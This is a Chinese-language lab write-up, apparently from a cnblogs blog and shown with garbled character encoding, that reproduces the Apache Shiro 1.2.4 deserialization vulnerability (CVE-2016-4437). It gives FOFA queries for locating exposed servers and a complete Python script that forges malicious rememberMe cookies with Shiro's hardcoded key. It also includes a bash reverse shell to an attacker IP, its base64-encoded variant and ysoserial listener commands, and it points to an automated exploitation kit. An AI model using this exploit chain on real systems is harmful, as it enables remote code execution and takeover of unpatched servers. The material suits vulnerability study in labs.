# CVE-2016-4437 Apache Shiro 1.2.4 ååºåˆ—åŒ–æ¼æ´ - ç¾å¼åŠ ç³– - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/peace-and-romance/p/15669560.html`](https://www.cnblogs.com/peace-and-romance/p/15669560.html)

### 0X00-å¼•è¨€

* * *

æœä»è®©æˆ‘ä»¬æ’‘è¿‡ç™½å¤©ï¼Œè€ŒæŠ•å…¥æ‰èƒ½è®©æˆ‘ä»¬æ’‘è¿‡å¤œæ™šã€‚------ä¸¹å°¼å°”Â·å¹³å…‹ã€Šé©±åŠ¨åŠ› 3.0ã€‹

### 0X01-ç¯å¢ƒæ­å»º

* * *

é¶æœºï¼šCentOS Linux 7

æ”»å‡»æœºï¼šwindows server 2016 && Kail

ç¯å¢ƒï¼švulhub

å·¥å…·ï¼šysoserialï¼Œburpsuiteï¼ŒLiqunKit

é¡¹ç›®åœ°å€ï¼š[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

æ­å»º vulhub è¯·è®¿é—®ï¼š[ç©ºç™½ centos7 64 æ­å»º vulhub(è¯¦ç»†)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

fofa è¯­æ³•ï¼š

```
header="rememberme=deleteMe"ã€header="shiroCookie" 
```

### 0X02-æ¼æ´æè¿°

* * *

Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiro æ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚

Apache Shiro 1.2.4 åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸º remember-me çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘ Java ååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

shiro é»˜è®¤ä½¿ç”¨ CookieRememberMeManagerï¼Œå¯¹ rememberMe çš„ cookie åšäº†åŠ å¯†å¤„ç†ï¼Œåœ¨ CookieRememberMeManaer ç±»ä¸­å°† cookie ä¸­ rememberMe å­—æ®µå†…å®¹å…ˆåè¿›è¡Œåºåˆ—åŒ–ã€AES åŠ å¯†ã€Base64 ç¼–ç æ“ä½œã€‚åœ¨è¯†åˆ«èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ Cookie é‡Œçš„ rememberMe å­—æ®µè§£å¯†ã€‚æ ¹æ®åŠ å¯†çš„é¡ºåºå¯ä»¥æ¨æ–­å‡ºè§£å¯†çš„é¡ºåºä¸ºè·å– cookie-base64 è§£ç -AES è§£å¯†-ååºåˆ—åŒ–ã€‚

AES åŠ å¯†çš„ KEY å€¼è¢«ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ï¼Œå¯ä»¥ä»æºç ä¸­æ‰¾åˆ° KEY å€¼ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ä»£ç ï¼Œå°†å…¶åºåˆ—åŒ–-AES åŠ å¯†-base64 ç¼–ç ï¼Œæœ€åä½œä¸º cookie å€¼å¾— rememberMe å­—æ®µå‘é€ï¼Œshiro å°†æ¥æ”¶åˆ°çš„ rememberMe å­—æ®µè¿›è¡Œè§£ç -è§£å¯†-ååºåˆ—åŒ–ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ„æˆæ”»å‡»ã€‚

å½±å“ç‰ˆæœ¬ï¼šApache Shiro <= 1.2.4

### 0X03-å·¥å…·ä¸‹è½½

* * *

##### 01-å®‰è£… mvn å‘½ä»¤

```
wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz  #ä¸‹è½½ maven å®‰è£…åŒ…
tar -zxvf apache-maven-3.5.4-bin.tar.gz  #è§£å‹ maven å®‰è£…åŒ…
mv apache-maven-3.5.4 /usr/local/  #ç§»åŠ¨åˆ° usr ä¸‹ local ç›®å½• 
```

é…ç½®ç¯å¢ƒå˜é‡ï¼Œåœ¨åº•éƒ¨æ·»åŠ å¦‚ä¸‹é…ç½®

vim /etc/profile

```
export MAVEN_HOME=/usr/local/apache-maven-3.5.4
export PATH=${PATH}:$MAVEN_HOME/bin 
```

é‡æ–°åŠ è½½ç¯å¢ƒå˜é‡

```
source /etc/profile 
```

å¯èƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°ç»ˆç«¯ï¼Œå¦‚å›¾ï¼Œ

![image-20211208223936493](img/e328401701213595e7046efc7cbf5641.png)

æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ

```
mvn  -v 
```

ç»ˆç«¯ä¸è¦å…³é—­ï¼Œå…ˆä¿æŒä¸åŠ¨

![image-20211208224117588](img/2b492f446a7b31eed37f4c2979562740.png)

##### 02-å®‰è£… ysoserial å·¥å…·

å¦èµ·ä¸€ä¸ªæ–°ç»ˆç«¯

```
mkdir Apacheshiro  #åˆ›å»ºæ–°ç›®å½•
git clone https://github.com/frohoff/ysoserial.git  #ä¸‹è½½ ysoserial 
```

![image-20211208224909757](img/87990da4263a258dbd2da8f717abca46.png)

åœ¨ä¸Šä¸€ä¸ªç»ˆç«¯é‡Œè¿›å…¥ ysoserial æ–‡ä»¶å¤¹

æ‰§è¡Œä»¥ä¸‹å‘½ä»¤-ç­‰å¾…ç»“æŸ

```
mvn package -D skipTests 
```

ç”Ÿæˆå·¥å…·

![image-20211208225044977](img/feeee1443abac7d3fb55e0d39ec1538e.png)

##### 03-å‡†å¤‡ shiro.py

å°† shiro.py ä¸ç”Ÿæˆçš„å·¥å…·æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹

shiro.py æºç ï¼š

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES	#pip install pycryptodome

def encode_rememberme(command):
	popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout = subprocess.PIPE)
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
	iv = uuid.uuid4().bytes
	encryptor = AES.new(key, AES.MODE_CBC, iv)
	file_body = pad(popen.stdout.read())
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	return base64_ciphertext

if __name__ == '__main__':
	payload = encode_rememberme(sys.argv[1])
	print("rememberMe={0}".format(payload.decode())) 
```

### 0X04-æ¼æ´å¤ç°

`http://192.168.234.128:8080/doLogin`

![image-20211209105146375](img/e908f481e31ac2d59f2c0b3b02fe81b5.png)

##### 01-æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ shiro ååºåˆ—åŒ–æ¼æ´

burp æŠ“åŒ…-repeater å‘åŒ…-çœ‹å›æ˜¾-å“åº”å¤´å­˜åœ¨ rememberMe å­—æ®µ-å­˜åœ¨ shiro ååºåˆ—åŒ–æ¼æ´

![image-20211209105619179](img/cfc3b63a35c3adb4bd53e9559a2001ef.png)

##### 02-å‡†å¤‡å¥½åå¼¹ shell çš„å‘½ä»¤

åå¼¹ shell å‘½ä»¤ï¼š`bash -i >& /dev/tcp/192.168.234.135/12345 0>&1`

åŠ å¯†ç½‘å€ï¼š[`www.jackson-t.ca/runtime-exec-payloads.html`](https://www.jackson-t.ca/runtime-exec-payloads.html)

åŠ å¯†ä¹‹åï¼š

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i} 
```

![image-20211209110024754](img/8271e88c3a73e5c769d5b59b20216729.png)

##### 03-kali æ‰§è¡Œå‘½ä»¤

åœ¨ç”Ÿæˆå·¥å…·ä¸ shiro.py æ‰€åœ¨çš„ç›®å½•ä¸‹æ‰§è¡Œ

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections4 â€˜bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMzUvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}â€™ 
```

![image-20211209110431859](img/235b374cad6ea2de62b5e052b595e3f7.png)

æ³¨æ„åå¼¹ shell å‘½ä»¤çš„å•å¼•å·ã€‚éœ€è¦åœ¨ kali ä¸­é‡æ–°è¾“å…¥å•å¼•å·

æ‰§è¡Œè„šæœ¬

```
python shiro.py 192.168.234.135:1234#192.168.234.135 ä¸ºæ”»å‡»æœº IP#1234 ä¸º ysoserial-0.0.6-SNAPSHOT-all.jar å·¥å…·ç›‘å¬çš„ç«¯å£ï¼Œä¸åå¼¹ shell çš„å‘½ä»¤ç«¯å£ä¸åŒï¼Œæˆ‘çš„å·¥å…·ç›‘å¬ä¸ nc åå¼¹ shell åœ¨åŒä¸€å° kali æœºå™¨ 
```

ç”Ÿæˆ poyload

![image-20211209110835217](img/8c0bcf174232f24b413274a2cb648f04.png)

##### 04-åå¼¹ shell

kali å¦èµ·å·²ç»ˆç«¯ï¼Œæ‰“å¼€ nc ç›‘å¬

![image-20211209110949708](img/fd363ceb0ed81b4b0cb2ba13ed81e374.png)

burp æŠ“åŒ…-repeater ä¿®æ”¹

![image-20211209111216079](img/de43c921e6bee186ef9232e896434249.png)

å‘é€

![image-20211209111308693](img/2a59e86b78dba0b19f5ea0248daee8eb.png)

ysoserial å·¥å…·ç›‘å¬åˆ°ä¿¡æ¯-å·²ä¸Šä¼ è‡³æœåŠ¡å™¨

![image-20211209111420549](img/06db345eb610c3b7174054afbf1c5281.png)

ä½†æ˜¯ nc æ²¡æœ‰åå¼¹ shell-ä¸çŸ¥é“åŸå› 

![image-20211209111456487](img/bc138a6bea547b2595c6ae3f157d7d3a.png)

##### 05-ç›´æ¥è¿›å…¥å®¹å™¨æ‰§è¡Œåå¼¹ shell å‘½ä»¤

å®¹å™¨å†…æ‰§è¡Œå‘ç°å¯ä»¥å›å¼¹ shell æ­£å¸¸ã€‚å¯¹æ¯”ä¹‹ä¸‹æˆ‘ä¹Ÿæ‰¾ä¸åˆ°ä¸Šé¢åå¼¹ shell å¤±è´¥çš„åŸå› ğŸ˜¯

![image-20211209160036228](img/889d088c1c924bafab0c6e842d4f6be6.png)

![image-20211209160100918](img/98306ff55e0dfa76bb565fe3266c08f8.png)

### 0X05-å·¥å…·åˆ©ç”¨

* * *

å·¥å…·åœ°å€ï¼š[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

##### 01-åå¼¹ shell

![image-20211209154638476](img/7d0691ff134b780233e78b5d19214303.png)

![image-20211209154821080](img/d493b64d9c9ef5abfd140ead1be6b3bf.png)

æˆåŠŸ

![image-20211209154855091](img/1fbc4adb8458f8a6071668513cd0ca92.png)

è¿˜æ˜¯å·¥å…·å¥½ç”¨ï¼Œæ‰‹åŠ¨å¤ç°åŠå¤©ï¼Œå·¥å…·ä¸€åˆ†é’Ÿåå¼¹ shellï¼Œæ·¦ğŸ˜‚

### 0X06-å‚è€ƒ

* * *

[Apache Shiro ååºåˆ—åŒ–æ¼æ´å¤ç°å¹¶åˆ©ç”¨ï¼ˆCVE-2016-4437ï¼‰](https://blog.csdn.net/qq_42773814/article/details/112393359)

[Apache Shiro ååºåˆ—åŒ–(CVE-2016-4437)å¤ç°](https://blog.csdn.net/m0_48520508/article/details/107770264?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.highlightwordscore)

[linux å®‰è£… maven ã€è§£å†³ï¼šbash: mvn: command not found](https://www.cnblogs.com/yuexiaoyun/articles/13033946.html)

[Apache Shiro 1.2.4 ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰å¤ç°](https://www.cnblogs.com/panisme/p/12552838.html)

[(CVE-2016-4437) Apache Shiro ååºåˆ—åŒ–æ¼æ´ å¤ç°](https://www.jianshu.com/p/cac9a7f2b3af)

[shiro ååºåˆ—åŒ–å¤ç°(ç»­ï¼‰ ---åˆ©ç”¨ docker-vulhub æ­å»ºå¤ç°ï¼ˆä¸ºäº†æ‰“å‡º shellï¼Œé’ˆå¯¹ linux ç³»ç»Ÿï¼‰](https://www.cnblogs.com/hcrk/p/13501200.html)